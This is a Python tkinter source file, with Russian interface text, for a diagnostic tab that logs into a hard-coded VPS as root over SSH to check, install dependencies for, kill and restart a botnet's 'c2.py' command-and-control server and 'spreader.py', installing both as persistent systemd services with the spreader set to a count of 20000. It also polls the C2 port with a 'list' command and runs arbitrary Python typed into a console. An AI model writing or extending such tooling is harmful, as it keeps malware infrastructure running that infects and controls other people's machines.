import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, simpledialog
import threading, paramiko, socket, json, time, os, sys, io, ast

class DiagnosticTab(ttk.Frame):
    def __init__(self, parent, app=None):
        super().__init__(parent)
        self.app = app
        self.vps_host = "80.249.146.202"
        self.vps_user = "root"
        self.vps_pass = None
        self.create_widgets()

    def create_widgets(self):
        btn_frame = ttk.Frame(self)
        btn_frame.pack(fill=tk.X, padx=5, pady=5)
        ttk.Button(btn_frame, text="Диагностика VPS", command=self.run_diag).pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_frame, text="Автоисправление VPS", command=self.run_repair).pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_frame, text="Проверить порт 80", command=self.check_port).pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_frame, text="Анализ кода", command=self.run_code_analysis).pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_frame, text="Создать вкладку", command=self.create_tab_wizard).pack(side=tk.LEFT, padx=2)

        self.log = scrolledtext.ScrolledText(self, height=10, bg='white', font=('Consolas', 9))
        self.log.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        console_frame = ttk.LabelFrame(self, text="Python-консоль (быстрые проверки)")
        console_frame.pack(fill=tk.X, padx=5, pady=5)
        self.code_entry = tk.Text(console_frame, height=4, bg='#ffffcc', font=('Consolas', 10))
        self.code_entry.pack(fill=tk.X, padx=5, pady=2)
        self.code_entry.insert(tk.END, "s = socket.socket(); s.settimeout(3); s.connect(('80.249.146.202',80)); s.sendall(b'list'); print(s.recv(4096).decode())")
        ttk.Button(console_frame, text="Выполнить код", command=self.exec_python).pack(pady=2)

    # ------------------- VPS диагностика -------------------
    def _ensure_pass(self):
        if not self.vps_pass:
            self.vps_pass = simpledialog.askstring("VPS пароль", f"Пароль для root@{self.vps_host}:", show='*')
        return self.vps_pass is not None

    def _ssh_exec(self, cmd):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(self.vps_host, username=self.vps_user, password=self.vps_pass, timeout=10)
        stdin, stdout, stderr = client.exec_command(cmd)
        out = stdout.read().decode(errors='replace')
        err = stderr.read().decode(errors='replace')
        client.close()
        return out, err

    def run_diag(self):
        if not self._ensure_pass(): return
        self.log.delete(1.0, tk.END)
        self.log.insert(tk.END, "[*] Запущена диагностика VPS...\n")
        def task():
            try:
                out, err = self._ssh_exec("ss -tlnp | grep -E '80|8080'")
                self.log.insert(tk.END, "--- Порты ---\n" + out + ("\n" if out else "порты не найдены\n"))
                out, err = self._ssh_exec("ps aux | grep -E 'c2.py|spreader.py' | grep -v grep")
                self.log.insert(tk.END, "--- Процессы ---\n" + (out if out else "нет процессов\n"))
                deps = ['aiohttp','paramiko','redis','docker','asyncssh']
                for dep in deps:
                    out, _ = self._ssh_exec(f"python3 -c 'import {dep}' 2>&1")
                    self.log.insert(tk.END, f"{dep}: {'OK' if 'not found' not in out else 'НЕТ'}\n")
                out, _ = self._ssh_exec("cat /root/c2/c2.log 2>/dev/null | tail -10")
                self.log.insert(tk.END, "--- Последние строки C2.log ---\n" + (out if out else "файл пуст или отсутствует\n"))
            except Exception as e:
                self.log.insert(tk.END, f"[!] Ошибка: {e}\n")
            self.log.see(tk.END)
        threading.Thread(target=task, daemon=True).start()

    def run_repair(self):
        if not self._ensure_pass(): return
        self.log.delete(1.0, tk.END)
        self.log.insert(tk.END, "[*] Запущено автоисправление VPS...\n")
        def task():
            try:
                self.log.insert(tk.END, "[*] Установка зависимостей...\n")
                cmds = [
                    "apt update -y",
                    "pip3 install aiohttp paramiko redis docker asyncssh",
                ]
                for cmd in cmds:
                    out, err = self._ssh_exec(cmd)
                    self.log.insert(tk.END, out + err)
                self.log.insert(tk.END, "[*] Остановка старых процессов...\n")
                self._ssh_exec("pkill -9 -f c2.py; pkill -9 -f spreader.py; screen -ls | awk '/\\./{print $1}' | xargs -I{} screen -S {} -X quit 2>/dev/null")
                self.log.insert(tk.END, "[*] Настройка systemd сервисов...\n")
                unit_c2 = """[Unit]
Description=AVZ C2 Server
After=network.target
[Service]
Type=simple
ExecStart=/usr/bin/python3 /root/c2/botnet/c2.py
Restart=always
[Install]
WantedBy=multi-user.target
"""
                unit_spreader = """[Unit]
Description=AVZ Spreader
After=network.target
[Service]
Type=simple
ExecStart=/usr/bin/python3 -u /root/c2/botnet/spreader.py --count 20000
Restart=always
[Install]
WantedBy=multi-user.target
"""
                self._ssh_exec(f"echo '{unit_c2}' > /etc/systemd/system/avz-c2.service")
                self._ssh_exec(f"echo '{unit_spreader}' > /etc/systemd/system/avz-spreader.service")
                self._ssh_exec("systemctl daemon-reload")
                self._ssh_exec("systemctl enable avz-c2 avz-spreader")
                self._ssh_exec("systemctl restart avz-c2 avz-spreader")
                out, _ = self._ssh_exec("systemctl status avz-c2 avz-spreader --no-pager")
                self.log.insert(tk.END, "--- Статус сервисов ---\n" + out)
            except Exception as e:
                self.log.insert(tk.END, f"[!] Ошибка: {e}\n")
            self.log.see(tk.END)
        threading.Thread(target=task, daemon=True).start()

    def check_port(self):
        self.log.delete(1.0, tk.END)
        self.log.insert(tk.END, "[*] Проверка порта 80...\n")
        def task():
            try:
                s = socket.socket()
                s.settimeout(5)
                s.connect((self.vps_host, 80))
                s.sendall(b"list")
                data = s.recv(1024)
                s.close()
                if data:
                    self.log.insert(tk.END, f"[+] Порт 80 доступен, ответ {len(data)} байт\n")
                else:
                    self.log.insert(tk.END, "[!] Порт 80 не ответил\n")
            except Exception as e:
                self.log.insert(tk.END, f"[!] Ошибка: {e}\n")
            self.log.see(tk.END)
        threading.Thread(target=task, daemon=True).start()

    def exec_python(self):
        code = self.code_entry.get(1.0, tk.END).strip()
        if not code:
            return
        self.log.insert(tk.END, f">>> {code}\n")
        def task():
            old_stdout = sys.stdout
            sys.stdout = io.StringIO()
            try:
                exec(code, {"__builtins__": __builtins__}, {"socket": socket, "time": time, "json": json, "requests": __import__('requests')})
                output = sys.stdout.getvalue()
                self.log.insert(tk.END, output + "\n")
            except Exception as e:
                self.log.insert(tk.END, f"[!] Ошибка: {e}\n")
            finally:
                sys.stdout = old_stdout
            self.log.see(tk.END)
        threading.Thread(target=task, daemon=True).start()

    # ------------------- АНАЛИЗ КОДА -------------------
    def run_code_analysis(self):
        self.log.delete(1.0, tk.END)
        self.log.insert(tk.END, "[*] Анализ локального кода...\n")
        def task():
            errors = []
            project_root = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
            for root, dirs, files in os.walk(project_root):
                for f in files:
                    if f.endswith('.py'):
                        path = os.path.join(root, f)
                        self._analyze_file(path, errors)
            if errors:
                for err in errors:
                    self.log.insert(tk.END, f"{err}\n")
            else:
                self.log.insert(tk.END, "[+] Ошибок не найдено\n")
            self.log.see(tk.END)
        threading.Thread(target=task, daemon=True).start()

    def _analyze_file(self, path, errors):
        try:
            with open(path, 'r', encoding='utf-8') as f:
                source = f.read()
        except:
            errors.append(f"[!] Не удалось прочитать {path}")
            return
        try:
            tree = ast.parse(source, filename=path)
        except SyntaxError as e:
            errors.append(f"[SYNTAX] {path}: строка {e.lineno}: {e.msg}")
            return

        classes = {}
        for node in ast.walk(tree):
            if isinstance(node, ast.ClassDef):
                bases = [ast.dump(b) for b in node.bases]
                if any('tk.Frame' in b or 'ttk.Frame' in b for b in bases):
                    methods = [n.name for n in node.body if isinstance(n, ast.FunctionDef)]
                    classes[node.name] = {'methods': set(methods), 'commands': set()}
                    for method in node.body:
                        if isinstance(method, ast.FunctionDef) and method.name == 'create_widgets':
                            for subnode in ast.walk(method):
                                if isinstance(subnode, ast.Call) and hasattr(subnode.func, 'value'):
                                    if isinstance(subnode.func.value, ast.Name) and subnode.func.value.id == 'self':
                                        if hasattr(subnode, 'keywords'):
                                            for kw in subnode.keywords:
                                                if kw.arg == 'command' and isinstance(kw.value, ast.Attribute) and isinstance(kw.value.value, ast.Name) and kw.value.value.id == 'self':
                                                    classes[node.name]['commands'].add(kw.value.attr)

        for cls_name, info in classes.items():
            missing = info['commands'] - info['methods']
            for m in missing:
                errors.append(f"[MISSING] {cls_name} в {path}: кнопка ссылается на self.{m}, но метод отсутствует")
            for method in info['methods']:
                for node in ast.walk(tree):
                    if isinstance(node, ast.FunctionDef) and node.name == method:
                        if len(node.body) == 1 and isinstance(node.body[0], ast.Pass):
                            errors.append(f"[EMPTY] {cls_name}.{method} в {path}: только pass")

        imports = []
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    imports.append(alias.name)
            elif isinstance(node, ast.ImportFrom):
                for alias in node.names:
                    imports.append(alias.name)
        source_without_imports = source
        for imp in imports:
            count = source_without_imports.count(imp)
            if count <= 1:
                errors.append(f"[UNUSED] {path}: импорт '{imp}' возможно не используется")

    # ------------------- Генератор вкладок -------------------
    def create_tab_wizard(self):
        class_name = simpledialog.askstring("Новая вкладка", "Имя класса (например, TestTab):")
        if not class_name:
            return
        tab_title = simpledialog.askstring("Заголовок вкладки", "Заголовок для интерфейса (например, Тест):")
        if not tab_title:
            return

        file_name = class_name.lower().rstrip('tab') + '_tab.py'
        content = f'''import tkinter as tk
from tkinter import ttk

class {class_name}(ttk.Frame):
    def __init__(self, parent, app=None):
        super().__init__(parent)
        self.app = app
        self.create_widgets()

    def create_widgets(self):
        ttk.Label(self, text="{tab_title}", font=("Arial", 12)).pack(pady=20)
        # Добавьте элементы интерфейса здесь
'''
        tabs_dir = os.path.dirname(os.path.abspath(__file__))
        file_path = os.path.join(tabs_dir, file_name)
        try:
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(content)
        except Exception as e:
            messagebox.showerror("Ошибка", f"Не удалось создать файл: {e}")
            return

        app_path = os.path.join(os.path.dirname(tabs_dir), 'app.py')
        try:
            with open(app_path, 'r', encoding='utf-8') as f:
                app_code = f.read()
        except:
            messagebox.showerror("Ошибка", "Не удалось прочитать app.py")
            return

        import_line = f"from gui.tabs.{file_name[:-3]} import {class_name}\n"
        if import_line not in app_code:
            lines = app_code.split('\n')
            last_import = None
            for i, line in enumerate(lines):
                if line.startswith('from gui.tabs.'):
                    last_import = i
            if last_import is not None:
                lines.insert(last_import + 1, import_line.rstrip('\n'))
                app_code = '\n'.join(lines)

        tabs_dict_pattern = '"Диагностика": DiagnosticTab,'
        if tabs_dict_pattern in app_code:
            new_tab_entry = f'            "{tab_title}": {class_name},\n'
            app_code = app_code.replace(tabs_dict_pattern, f'{new_tab_entry}            {tabs_dict_pattern}')

        with open(app_path, 'w', encoding='utf-8') as f:
            f.write(app_code)

        messagebox.showinfo("Готово", f"Вкладка {class_name} создана в {file_name} и добавлена в app.py.\nПерезапустите программу.")
        self.log.insert(tk.END, f"[+] Создана вкладка {class_name} в {file_name}\n")